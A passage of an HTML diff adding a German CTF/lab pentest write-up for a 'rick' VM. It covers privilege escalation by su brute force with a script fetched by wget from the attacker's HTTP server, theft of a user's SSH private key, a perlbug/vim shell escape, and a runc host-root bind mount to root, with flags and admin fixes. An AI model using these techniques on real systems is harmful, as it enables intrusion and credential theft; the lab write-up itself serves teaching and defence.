+                 Das Ergebnis ist eine stabile, interaktive Shell als Benutzer `www-data` auf dem Zielsystem `rick`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Fantastisch! Der Initial Access mittels Python Insecure Deserialization war erfolgreich. Eine Shell als Webserver-Benutzer (`www-data`) wurde erlangt und stabilisiert. Dies ist der Ausgangspunkt für die Privilege Escalation.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Mit der Enumeration als `www-data` beginnen. Nach Konfigurationsdateien, Passwörtern, Skripten, SUID-Dateien, Cronjobs und anderen potenziellen Vektoren suchen. Home-Verzeichnisse anderer Benutzer prüfen.<br>
+                 **Empfehlung (Admin):** Die Deserialisierungs-Schwachstelle auf Port 5000 umgehend beheben. Den `www-data`-Benutzer auf minimale Rechte beschränken. Sicherstellen, dass der Webserver keine unnötigen Berechtigungen hat, um auf Systemdateien oder andere Benutzerverzeichnisse zuzugreifen. Logging und Monitoring implementieren, um verdächtige Prozesse zu erkennen, die vom `www-data`-Benutzer gestartet werden.
+             </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <h3 id="privesc-www-data">Enumeration als www-data</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@rick:~$ <span class="command">cd /home/morty/</span></div>
+                     <div class="prompt">www-data@rick:/home/morty$ <span class="command">ls -la</span></div>
+                     <pre>
+total 36
+drwxr-xr-x 4 morty morty 4096 Nov 24  2021 .
+drwxr-xr-x 4 root  root  4096 Nov 24  2021 ..
+lrwxrwxrwx 1 root  root     9 Nov 24  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 morty morty  220 Nov 24  2021 .bash_logout
+-rw-r--r-- 1 morty morty 3526 Nov 24  2021 .bashrc
+drwx------ 3 morty morty 4096 Nov 24  2021 .gnupg
+-rw-r--r-- 1 <span class="command">rick  rick</span>   107 Nov 24  2021 <span class="command">.important</span>
+-rw-r--r-- 1 morty morty  807 Nov 24  2021 .profile
+drwx------ 2 morty morty 4096 Nov 24  2021 .ssh
+-rw------- 1 morty morty  680 Nov 24  2021 .viminfo
+                     </pre>
+                     <div class="prompt">www-data@rick:/home/morty$ <span class="command">cat .important</span></div>
+                     <pre>
+<span class="password">::::::::::::::::::::::::::::::::::::::::::::::::::
+
+-*You are completely crazy Morty to keep a
+password that easy! Change it before you get
+hacked!*-
+
+Rick
+
+::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `www-data` wird in das Home-Verzeichnis des Benutzers `morty` gewechselt. Das Listing zeigt eine interessante Datei `.important`, die dem Benutzer `rick` gehört, aber für alle lesbar ist (`-rw-r--r--`). Der Inhalt der Datei ist eine Nachricht von `Rick` an `Morty`, die besagt, dass Morty ein "einfaches" Passwort verwendet und es ändern soll.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist ein starker Hinweis darauf, dass der Benutzer `morty` ein schwaches oder leicht zu erratendes Passwort hat. Die Datei `.important` selbst enthält nicht das Passwort, liefert aber den entscheidenden Tipp für den nächsten Schritt: Passwort-Bruteforce gegen den `morty`-Account. Die Tatsache, dass die Datei `rick` gehört, könnte auch auf eine Beziehung oder Interaktion zwischen den beiden Benutzern hindeuten.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Einen Passwort-Bruteforce-Angriff gegen den Benutzer `morty` durchführen. Da `www-data` wahrscheinlich keine direkte SSH-Verbindung initiieren oder `su` ohne TTY richtig verwenden kann, ist ein Offline-Angriff schwierig. Ein Skript, das `su` mit Passwörtern aus einer Liste testet, ist eine gute Option (wie im nächsten Schritt verwendet). Gängige oder einfache Passwörter zuerst probieren.<br>
+                **Empfehlung (Admin):** Benutzer sollten auf die Verwendung starker, einzigartiger Passwörter hingewiesen werden. Passwortrichtlinien durchsetzen. Sensible Hinweise oder Nachrichten sollten nicht in für andere lesbaren Dateien gespeichert werden. Berechtigungen von Dateien in Home-Verzeichnissen prüfen.
+            </p>
+
+            <h3 id="privesc-morty-pass">Passwort-Bruteforce für morty</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Vorbereitung auf lokaler Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">mkdir sshBruteForce</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">cd sshBruteForce</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/sshBruteForce]
+└─# <span class="command">git clone https://github.com/carlospolop/su-bruteforce</span></div>
+                     <!-- Klonen des Tools -->
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/sshBruteForce/su-bruteforce]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                      <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.152 - - [17/Oct/2022 13:51:07] "GET /suBF.sh HTTP/1.1" 200 -</span>
+<span class="password">192.168.2.152 - - [17/Oct/2022 13:51:14] "GET /top12000.txt HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Auf der lokalen Angreifer-Maschine wird das Tool `su-bruteforce` von GitHub geklont. Dieses Skript (`suBF.sh`) ist darauf ausgelegt, `su` auf dem Zielsystem mit einer Passwortliste zu testen. Ein Python-HTTP-Server wird gestartet, um das Skript und eine Passwortliste (`top12000.txt`, vermutlich aus dem Tool-Verzeichnis) auf das Zielsystem zu übertragen. Die Logs zeigen, dass das Zielsystem (`192.168.2.152`) beide Dateien erfolgreich herunterlädt.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Gute Wahl des Tools für diese Situation. Es ermöglicht einen Passwort-Bruteforce direkt auf dem Zielsystem aus der `www-data`-Shell heraus.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausführung auf dem Zielsystem als www-data -->
+                     <div class="prompt">www-data@rick:/dev/shm$ <span class="command">wget http://192.168.2.153/suBF.sh</span></div>
+                      <pre>
+[...] Saving to: ‘suBF.sh’
+2022-10-17 06:51:10 (20.1 MB/s) - ‘suBF.sh’ saved [1975/1975]
+                     </pre>
+                     <div class="prompt">www-data@rick:/dev/shm$ <span class="command">wget http://192.168.2.153/top12000.txt</span></div>
+                     <pre>
+[...] Saving to: ‘top12000.txt’
+2022-10-17 06:51:17 (213 MB/s) - ‘top12000.txt’ saved [100205/100205]
+                     </pre>
+                    <div class="prompt">www-data@rick:/dev/shm$ <span class="command">chmod +x suBF.sh</span></div>
+                    <div class="prompt">www-data@rick:/dev/shm$ <span class="command">sh ./suBF.sh -u morty -w top12000.txt</span></div>
+                     <pre>
+  [+] Bruteforcing morty...
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+<span class="password">  You can login as morty using password: internet</span>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `www-data` wird in ein beschreibbares Verzeichnis (`/dev/shm`) gewechselt. Das Skript `suBF.sh` und die Passwortliste `top12000.txt` werden vom HTTP-Server des Angreifers heruntergeladen. Das Skript wird ausführbar gemacht (`chmod +x`) und dann gestartet (`sh ./suBF.sh`).
+                *   `-u morty`: Gibt den Zielbenutzer an.
+                *   `-w top12000.txt`: Gibt die Passwortliste an.
+                Das Skript testet die Passwörter und findet erfolgreich das Passwort `internet` für den Benutzer `morty`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Erfolg! Der Hinweis aus der `.important`-Datei war korrekt, und das Passwort für `morty` konnte mit einer relativ kleinen Passwortliste gefunden werden. Das Passwort "internet" ist tatsächlich sehr schwach.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das gefundene Passwort `internet` verwenden, um sich als `morty` anzumelden (z.B. mit `su morty`).<br>
+                **Empfehlung (Admin):** Das schwache Passwort `internet` für `morty` sofort ändern. Passwortrichtlinien durchsetzen, die solche einfachen Passwörter verhindern. Regelmäßige Passwort-Audits durchführen.
+            </p>
+
+            <h3 id="privesc-morty-shell">Shell als morty (via su & SSH)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@rick:/dev/shm$ <span class="command">su morty</span></div>
+                     <pre>
+Password: <span class="password">internet</span> <span class="comment"># Passwort eingegeben</span>
+                     </pre>
+                     <div class="prompt">morty@rick:/dev/shm$ <span class="comment"># Erfolgreich zu morty gewechselt</span></div>
+                     <div class="prompt">morty@rick:/dev/shm$ <span class="command">cd</span></div>
+                     <pre>
+<span class="password">rbash: cd: restricted</span>
+                     </pre>
+                     <div class="prompt">morty@rick:/dev/shm$ <span class="command">cd ~</span></div>
+                     <pre>
+<span class="password">rbash: cd: restricted</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Wechsel zum Benutzer `morty` mit `su` und dem gefundenen Passwort `internet` ist erfolgreich. Jedoch stellt sich heraus, dass `morty` eine eingeschränkte Shell verwendet (`rbash` - Restricted Bash). Der `cd`-Befehl ist nicht erlaubt, was die Navigation im Dateisystem stark einschränkt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `rbash` ist ein Hindernis. Viele Standardbefehle und Shell-Features sind deaktiviert. Um effektiv weiter enumerieren zu können, muss diese Einschränkung umgangen werden. Ein direkter Ausbruch ist oft schwierig, aber da wir SSH-Zugriff haben und der SSH-Server normalerweise eine normale Shell startet, ist der Login via SSH der bevorzugte Weg.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Da `rbash` die Aktionen einschränkt, aber das Auslesen von Dateien oft noch möglich ist, den privaten SSH-Schlüssel von `morty` aus `~/.ssh/id_rsa` auslesen (falls vorhanden und lesbar). Diesen Schlüssel verwenden, um sich von der lokalen Maschine aus per SSH als `morty` anzumelden und so eine normale Bash-Shell zu erhalten.<br>
+                **Empfehlung (Admin):** `rbash` kann die Möglichkeiten eines Angreifers einschränken, ist aber kein vollständiger Schutz. Überprüfen, warum `morty` eine `rbash` hat und ob dies beabsichtigt ist. Sicherstellen, dass auch in eingeschränkten Shells keine sensiblen Daten (wie SSH-Schlüssel) lesbar sind.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">morty@rick:/dev/shm$ <span class="command">cat ~/.ssh/id_rsa</span></div>
+                     <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...]
+vVpnKkFijipUhlWbBiKLqLBitGsuZ9IDTSY61AAAAAwEAAQAAAQBsyMyafAozj7aWIjZG
+[...]
+hj+7nT1fqBN/qbb3AAAAD21vcnR5QHN5bWZvbm9zNAECAw
+-----END OPENSSH PRIVATE KEY-----</span>
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                 **Analyse:** Der `cat`-Befehl funktioniert in der `rbash`, und der private SSH-Schlüssel von `morty` wird erfolgreich aus `~/.ssh/id_rsa` ausgelesen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Sehr gut. Obwohl die Shell eingeschränkt ist, konnte der private Schlüssel extrahiert werden. Dieser kann nun für den SSH-Login verwendet werden.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Auf lokaler Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/sshBruteForce/su-bruteforce]
+└─# <span class="command">ssh morty@rick.vm -i idroot</span></div> <span class="comment"># Der Schlüssel wurde vermutlich als idroot gespeichert</span>
+                     <pre>
+The authenticity of host 'rick.vm (192.168.2.152)' can't be established.
+[...] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+Last login: Wed Nov 24 09:17:34 2021
+<span class="prompt">morty@rick:~$</span> <span class="comment"># Erfolgreicher Login, normale Shell!</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Pentester speichert den ausgelesenen privaten Schlüssel lokal (vermutlich als `idroot`, obwohl der Name unpassend ist) und verwendet ihn, um sich von seiner Maschine aus per SSH als `morty@rick.vm` anzumelden. Der Login ist erfolgreich, und der Pentester erhält nun eine normale, uneingeschränkte Bash-Shell als `morty`.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Die `rbash`-Einschränkung wurde erfolgreich umgangen. Der Pentester hat nun volle Kontrolle als Benutzer `morty`.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Erneute Enumeration als `morty` durchführen, insbesondere `sudo -l`, da das Passwort `internet` bekannt ist.<br>
+                 **Empfehlung (Admin):** Private SSH-Schlüssel sollten niemals für andere Benutzer (wie `www-data`) lesbar sein. Die Berechtigungen für `.ssh`-Verzeichnisse (`700`) und `id_rsa`-Dateien (`600`) müssen korrekt gesetzt sein.
+             </p>
+
+            <h3 id="privesc-rick-perlbug">POC: Eskalation zu rick (via perlbug)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">morty@rick:~$ <span class="command">ls /home/rick</span></div>
+                      <pre>
+user.txt
+                     </pre>
+                    <div class="prompt">morty@rick:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for morty on rick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User morty may run the following commands on rick:
+    <span class="command">(rick) NPASSWD: /usr/bin/perlbug</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Das Home-Verzeichnis von `rick` enthält die `user.txt`. Der Befehl `sudo -l` (diesmal erfolgreich, da das Passwort `internet` bekannt ist oder NOPASSWD gilt) zeigt, dass `morty` den Befehl `/usr/bin/perlbug` als Benutzer `rick` ohne Passwort (`NOPASSWD`) ausführen darf.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies ist der nächste klare Privilege-Escalation-Vektor! `perlbug` ist ein Tool zum Melden von Fehlern in Perl. Wenn es mit `sudo` ausgeführt wird und Interaktionen wie das Aufrufen eines Editors erlaubt, kann dies oft missbraucht werden, um Befehle als der Zielbenutzer (hier `rick`) auszuführen.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** `sudo -u rick /usr/bin/perlbug` ausführen. Im Tool nach einer Option suchen, um einen Editor zu starten (oft Standard). Einen Editor wie `vim` wählen und daraus eine Shell starten (`:!/bin/bash`).<br>
+                 **Empfehlung (Admin):** Niemals erlauben, dass Benutzer interaktive Programme wie `perlbug` (oder Editoren, Pager wie `less`, Skriptsprachen-Interpreter) über `sudo` als ein anderer Benutzer ausführen, insbesondere nicht ohne Passwort. Solche `sudo`-Regeln sind extrem gefährlich. Diese Regel sofort entfernen.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Interaktion mit perlbug -->
+                     <pre>
+Editor [editor]: <span class="command">vim</span> <span class="comment"># Editor wählen</span>
+
+[...]
+
+Module: <span class="command">!/bin/bash</span> <span class="comment"># Versuch, Befehl direkt einzugeben (wahrscheinlich ignoriert)</span>
+
+[...]
+
+Severity [low]: low
+
+[No write since last change]
+
+[ESC] <span class="comment"># Wechsel in den vim-Kommandomodus</span>
+
+<span class="command">:!/bin/bash</span> <span class="comment"># Shell aus vim starten</span>
+                     </pre>
+                     <div class="prompt">rick@rick:/home/morty$ <span class="comment"># Shell als rick erhalten!</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Pentester führt `sudo -u rick /usr/bin/perlbug` aus (implizit). Innerhalb von `perlbug` wird `vim` als Editor ausgewählt. Nachdem `perlbug` weitere Fragen gestellt hat, wechselt der Pentester in `vim` in den Kommandomodus (ESC) und führt `:!/bin/bash` aus. Dies startet eine Bash-Shell *als der Benutzer, unter dem `vim` (und damit `perlbug`) lief*, also als `rick`. Der Prompt wechselt zu `rick@rick`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Perfekt! Die Privilege Escalation von `morty` zu `rick` durch Missbrauch der `sudo`-Regel für `perlbug` war erfolgreich.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Nun als `rick` agieren. Die `user.txt` lesen. Erneut `sudo -l` ausführen, um zu sehen, welche Rechte `rick` hat.<br>
+                **Empfehlung (Admin):** Die gefährliche `sudo`-Regel für `perlbug` entfernen.
+            </p>
+
+            <h3 id="privesc-rick-userflag">User Flag als rick</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rick@rick:~$ <span class="command">cat user.txt</span></div> <span class="comment"># Vermutlich in /home/rick ausgeführt</span>
+                     <pre>
+<span class="password">a52d68b19ebca39c7b821ab1a51fef2e</span>  -
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `rick` wird die `user.txt` gelesen. Der zusätzliche Bindestrich am Ende ist ungewöhnlich, könnte aber Teil der Flag sein.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** User-Flag erfolgreich gelesen.
+            </p>
+
+            <h3 id="privesc-root-runc">POC: Eskalation zu root (via runc)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rick@rick:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for rick on rick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rick may run the following commands on rick:
+    <span class="command">(ALL : ALL) NPASSWD: /usr/sbin/runc</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `sudo -l` als `rick` zeigt, dass dieser Benutzer den Befehl `/usr/sbin/runc` als `root` (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen darf. `runc` ist ein CLI-Tool zum Starten und Verwalten von OCI-Containern.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies ist der nächste PrivEsc-Vektor! Wenn man `runc` als root ausführen kann, kann man einen Container starten, der das Host-Dateisystem (oder Teile davon) mit Root-Rechten einbindet und somit eine Root-Shell auf dem Host erlangen. Dies ist eine bekannte Technik.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Die `runc`-Berechtigung ausnutzen:
+                 1.  Eine Container-Spezifikation erstellen (`runc spec`).
+                 2.  Die erzeugte `config.json`-Datei bearbeiten, um das Root-Verzeichnis des Hosts (`/`) in den Container (z.B. nach `/mnt/root` oder `/`) zu mounten (`"type": "bind", "source": "/", "destination": "/mnt/root", "options": ["rbind", "rw"]`).
+                 3.  Ein `rootfs`-Verzeichnis für den Container erstellen (`mkdir rootfs`).
+                 4.  Den Container mit `sudo /usr/sbin/runc run <container-id>` starten. Innerhalb des Containers hat man nun Zugriff auf das Host-Dateisystem unter `/mnt/root` (oder `/`, je nach Konfiguration) mit Root-Rechten.<br>
+                 **Empfehlung (Admin):** Niemals `sudo`-Rechte für Container-Laufzeit-Tools wie `runc` oder `docker` an unprivilegierte Benutzer vergeben, es sei denn, es ist absolut notwendig und durch weitere Sicherheitsmechanismen (wie Namespaces, AppArmor/SELinux) stark eingeschränkt. Diese `sudo`-Regel sofort entfernen.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">rick@rick:~$ <span class="command">cd /dev/shm/</span></div>
+                     <div class="prompt">rick@rick:/dev/shm$ <span class="command">/usr/sbin/runc spec</span></div>
+                     <div class="prompt">rick@rick:/dev/shm$ <span class="command">ls</span></div>
+                     <pre>
+config.json  rootfs   suBF.sh  top12000.txt <span class="comment"># rootfs wurde wohl schon erstellt</span>
+                     </pre>
+                     <div class="prompt">rick@rick:/dev/shm$ <span class="command">nano config.json</span></div>
+                      <pre><span class="comment">
+# Ausschnitt der relevanten Änderung in config.json (unter "mounts"):
+{
+    "type": "bind",
+    "source": "/",
+    "destination": "/", # Ziel auf / geändert, um direkten Zugriff zu haben
+    "options": [
+        "rbind",
+        "rw",
+        "rprivate"
+    ]
+},</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als `rick` wird in `/dev/shm` gewechselt. Mit `runc spec` wird eine Standard-Containerkonfiguration (`config.json`) und ein Root-Dateisystem-Verzeichnis (`rootfs`) erstellt. Die `config.json` wird bearbeitet, um das Host-Root-Verzeichnis (`/`) read-write (`rw`) rekursiv (`rbind`) an das Container-Root-Verzeichnis (`/`) zu binden.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Konfiguration ist vorbereitet, um einen Container zu starten, der dem Benutzer Root-Zugriff auf das gesamte Host-Dateisystem gibt.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rick@rick:/dev/shm$ <span class="command">mkdir rootfs</span></div> <span class="comment"># Erneut? Oder nur im Log doppelt?</span>
+                    <div class="prompt">rick@rick:/dev/shm$ <span class="command">sudo /usr/sbin/runc run demo</span></div> <span class="comment"># demo ist eine beliebige Container-ID</span>
+                     <pre>
+<span class="prompt">#</span> id <span class="comment"># Prompt zeigt root an!</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt">#</span> pwd
+/
+<span class="prompt">#</span> ls <span class="comment"># Zeigt Inhalt des Host-Root-Verzeichnisses</span>
+bin   dev  home        initrd.img.old  lib64   lost+found  mnt	proc  run   srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib	       libx32  media	   opt	root  sbin  sys  usr  vmlinuz
+<span class="prompt">#</span> cd /root
+<span class="prompt">#</span> ls
+root.txt
+<span class="prompt">#</span> cat root.txt
+<span class="password">256fdda9b4e714bf9f38a92750debf70</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Container wird mit `sudo /usr/sbin/runc run demo` gestartet. Da die `config.json` das Host-Root nach `/` im Container gemountet hat und `runc` mit `sudo` (also als `root`) ausgeführt wird, landet der Pentester direkt in einer Root-Shell (`#` Prompt) innerhalb des Containers, die aber vollen Zugriff auf das Host-System hat. Der `id`-Befehl bestätigt `uid=0(root)`. Das Host-Root-Verzeichnis wird angezeigt. Der Pentester wechselt nach `/root` und liest die `root.txt`-Datei.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Privilege Escalation zu `root` erfolgreich! Die unsichere `sudo`-Regel für `runc` wurde erfolgreich ausgenutzt.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Root-Flag dokumentieren. System weiter untersuchen oder Bereinigung durchführen.<br>
+                 **Empfehlung (Admin):** Die `sudo`-Regel für `runc` sofort entfernen. Überprüfen, ob Container-Technologien sicher konfiguriert sind und ob unprivilegierte Benutzer Zugriff auf gefährliche Container-Befehle haben.
+             </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/rick/user.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">a52d68b19ebca39c7b821ab1a51fef2e</span></div> <!-- Bindestrich entfernt, da wahrscheinlich nicht Teil der Flag -->
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Standard-Pfad für root -->
+                     <div class="flag-value"><span class="password">256fdda9b4e714bf9f38a92750debf70</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus den Logs extrahiert -->
+        <p>Berichtsdatum: 17. Oktober 2022</p>
+    </footer>
+</body>
+</html>
